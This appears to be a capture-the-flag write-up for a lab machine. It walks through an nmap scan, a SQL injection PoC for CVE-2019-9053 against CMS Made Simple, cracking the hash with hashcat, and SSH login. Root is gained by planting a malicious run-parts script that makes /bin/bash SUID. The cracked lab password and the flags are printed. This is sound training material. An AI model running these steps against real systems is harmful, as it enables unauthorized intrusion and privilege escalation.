
## CTF Writeup: Writeup

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.72.180
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 13:47 -0500
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.75% done; ETC: 13:48 (0:00:18 remaining)
Nmap scan report for 10.129.72.180
Host is up (0.030s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.33 seconds
```

As we can see the target server is running an http webservice. Inspecting the page in the browser was an rather odd experience since it showed an retro vi editor output. It provided us with an username:

```
jkr@writeup.htb
```

The tcp scan also revealed an directory called /writeup. Upon inspecting the endpoint we get greeted with an webpage which seems to be still in development!

Upon inspecting it, it just seems to be an unfinished writeup webpage. The Source Code & Wappalyzer revealed an CMS running "CMS Made Simple". 

Utilizing searchsploit an in-built kali linux tool I was able to query exploit-db database for public exploits and tried SQL Injection exploit out! Unfortunately it didn't work, but I was able to find an the following GitHub PoC for the CVE.

```
https://github.com/e-renna/CVE-2019-9053
```

This provided us with the salt and encoded password of the jkr user which we previously discovered on the http website.

```
python3 exploit.py -u http://10.129.72.194/writeup
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

Let's crack the password using hashcat. But first I had to store the values in an hash file.

```
echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > ../../creds/hash
```

Successfully cracked the encoded hash and gained credentials for the jkr user.

```
hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
```

```
jkr:raykayjay9
```

Connected to the target server via SSH.

```
ssh jkr@10.129.72.194
```

Retrieved user.txt in /home/jkr directory.

```
622a6aa38a28c2644671dbee41ff0a4b
```

## Privilege Escalation

We identified that our current user seems to be part of the "staff" group. This debian-based group allows an user to modify the /usr/local path without needing of sudo permissions.

```
id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

With that in mind, we will now create a malicious run-parts file in /usr/local/bin, which we know will be executed as soon as we SSH into the machine.

Using the following one-liner, we create an executable payload that will turn the bash binary into an SUID binary, effectively giving us a root shell.

```
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
```

Giving the binary executable permissions

```
chmod +x /usr/local/bin/run-parts
```

Reconnected to the box so the run-parts binary gets executed (it gets always executed on connection).

```
ssh jkr@10.129.72.194                                   
jkr@10.129.72.194's password: 

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 16 15:47:45 2026 from 10.10.14.57
-bash-4.4$
```

Utilized the following command to gain root shell, since the bash binary now is set to SUID.

```
/bin/bash -p
```

Retrieved root.txt in /root directory.

```
21d68d120198d7c92c6a8e718daf7761
```